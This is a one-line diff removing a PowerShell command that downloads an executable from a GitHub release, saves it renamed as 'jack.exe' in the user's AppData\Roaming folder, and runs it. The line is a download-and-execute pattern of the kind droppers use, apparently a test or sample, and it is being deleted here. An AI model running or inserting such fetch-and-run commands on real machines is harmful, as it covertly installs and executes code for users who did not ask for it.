@@ -1,1 +1,0 @@
-$e=New-Object System.Net.WebClient;$e.DownloadFile("https://github.com/pbatard/rufus/releases/download/v3.20/rufus-3.20.exe","$HOME\AppData\Roaming\jack.exe");Start-Process -FilePath "$HOME\AppData\Roaming\jack.exe"
